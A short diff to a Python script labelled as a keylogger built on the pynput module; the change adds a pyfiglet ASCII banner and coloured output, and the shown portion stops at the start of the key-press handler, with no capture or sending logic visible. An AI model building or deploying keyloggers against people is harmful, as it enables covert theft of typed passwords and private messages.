@@ -1,8 +1,13 @@
 # keylogger using pynput module
-  
+
+import pyfiglet 
 import pynput
 from pynput.keyboard import Key, Listener
+from colorama import Fore 
   
+banner = pyfiglet.figlet_format('Keylogger', font='doom')
+print(Fore.BLUE + banner)
+
 keys = []
   
 def on_press(key):
